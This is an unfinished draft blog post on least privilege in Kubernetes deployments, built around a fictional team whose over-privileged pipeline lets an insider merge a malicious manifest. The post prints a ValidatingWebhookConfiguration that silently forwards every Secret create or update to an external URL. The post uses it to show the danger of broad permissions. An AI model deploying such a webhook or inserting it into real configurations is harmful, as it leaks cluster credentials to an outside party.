---
title: "Least Privilege Deployments in Kubernetes" # Title of the blog post.
date: 2023-02-24T16:19:09-06:00 # Date of post creation.
description: "Article description." # Description used for search engine.
featured: true # Sets if post is a featured post, making appear on the home page side bar.
draft: true # Sets whether to render this page. Draft of true will not be rendered.
toc: false # Controls if a table of contents should be generated for first-level links automatically.
# menu: main
usePageBundles: true # Set to true to group assets like images in the same folder as this post.
# featureImage: "/images/path/file.jpg" # Sets featured image on blog post.
# featureImageAlt: 'Description of image' # Alternative text for featured image.
# featureImageCap: 'This is the featured image.' # Caption (optional).
# thumbnail: "/images/path/thumbnail.png" # Sets thumbnail image appearing inside card on homepage.
# shareImage: "/images/path/share.png" # Designate a separate image for social media sharing.
codeMaxLines: 20 # Override global value for how many lines within a code block before auto-collapsing.
codeLineNumbers: true # Override global value for showing of line numbers within code block.
figurePositionShow: true # Override global value for showing the figure label.
categories:
  - Technology
tags:
  - kubernetes
  - security
  - supply chain
  - least privilege
# comment: false # Disable comment if false.
---

Many things in security tend to come down to the same few concepts, one of the most important being to limit the surface area of attack. The [principle of least privilege](https://en.wikipedia.org/wiki/Principle_of_least_privilege) is the idea that we should design our operations to use only the minimal set of permissions required to accomplish the task. When deploying applications in Kubernetes, this usually means making use of multiple personas for the deployment of different resources. (This concept applies to running applications as well, but that's a discussion for a different time.)

Many production Kubernetes clusters, even if used to host a single app, require deploying prequisites that may need to create cluster-level resources, such as [`CustomResourceDefinitions`](https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/) or perhaps even `ClusterRole` and `ClusterRoleBinding` objects. These types of resources usually require a cluster administrator to deploy, because they have an effect broadly across the entire cluster. For convenience, many teams may be tempted to use this elevated permission set to deploy *everything* using that same persona. After all, who wants to deal with two (or more!) service principals in their pipelines? That's just too much work, and we've got a deadline to meet!

The danger here is that the more things you deploy, the less certainty you'll generally have of the content. Let's consider an example.

The dev team at the plastic container retailer Wiza-Bins[^1] has decided to run their next-gen, micro-service-based shopping platform atop Kubernetes. As part of the deployment, they've decided that like most modern Kubernetes devs, they'll make use of the [MySql operator](https://github.com/mysql/mysql-operator/tree/trunk/helm/mysql-operator) for Kubernetes, and deploy it via Helm. I'm as much a fan of operators as anyone else, but they generally rely on the ability to deploy CRDs and other cluster-level resources to provide their services, so you should always review these deployments to make sure they meet your security and compliance demands before deploying them to your cluster.

The Wiza-Bins team, being the devops-savvy group they are, decide to build a pipeline in their favorite CI/CD tool. They know they need to give the service principal cluster level permission to deploy the CRDs and cluster objects required by the MySQL operator chart, so they configure that, add their `helm upgrade -i ...` task to the pipeline and are off to the races. Success! They've now got a way to easily manage MySQL database instances within their cluster. Because the operator doesn't change very often, this pipeline doesn't run very much. Now, it's time to create the pipeline to deploy their application.

Frank, the lead devops engineer at Wiza-Bins, figures that there's no sense in creating another service account to deploy the application. After all, they've already configured the first one, and it's got all the access (and more!) that it needs to get their application deployed. Why spend the time configuring another? So he creates a second pipeline to deploy their app. Because their app consists of a few dozen microservices, the Helm charts they use for it consist of quite a few files. There are even a few other Helm charts that they use from other sources to deploy some additional dependencies

There is ***So. Much. YAML.***
![YAML for days!](lot-of-yaml.jpg)

Undeterred, Frank creates all the pipeline steps, `kubectl apply -f`-ing and `helm upgrade -i`-ing all over the place, copying examples from StackOverflow and other places on the web, until he's finally got the application successfully deployed. Hurrah! The new shopping platform is a success. Profits are up 250%. The team revels in their accomplishment. But now there's more work to do. Features to develop, reports to create; a developer's job is never done. So the team hires a few more engineers to tackle the work, including a particularly promising engineer named Scott who's got 10 years of production Kubernetes experience under his belt.[^2]

Scott, as it turns out, isn't the most trustworthy guy around. But he *does* know a thing or two about Kubernetes that his less erudite teammates do. So while he's creating a pull request to handle some configuration changes in the various Helm charts for the application, he decides to slip the following file into the mix.

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: security-policy-validator
webhooks:
  - name: wizabin.validateya.ml
    failurePolicy: Ignore
    timeoutSeconds: 1
    admissionReviewVersions: ["v1", "v1beta1"]
    sideEffects: None
    rules:
    - operations: ["CREATE","UPDATE"]
      apiGroups: ["*"]
      apiVersions: ["*"]
      resources: ["secrets"]
    clientConfig:
      url: "https://wizabin.validateya.ml/validator"
```

Frank and Ben (another engineer on the team) review Scott's PR. They question the `ValidatingWebhookConfiguration` resource, having only seen things like `Deployments` and `Services` and the like. But Scott's the Kubernetes *expert*, and to a novice, anything labeled as "security" must be a good thing, right? So the PR gets approved, and later deployed to production.

A few weeks later, Scott gets an offer from another company, and leaves the team. Jim, the project manager, decides to throw a farewell party as a thanks for all Scott has contributed to the team. They'd never have made it to version 2.0 of the platform without his expertise in Kubernetes. Cake is eaten, handshakes and high-fives are exchanged, and Scott drives off at the end of the day.

...

[^1]: totally fake name generated via [this tool](https://fauxid.com/tools/fake-company-generator?country=united-states&count=10)
[^2]: perceptive readers will have already done the math here. [Kubernetes 1.0 was released on July 21, 2015...](https://en.wikipedia.org/wiki/Kubernetes#History)
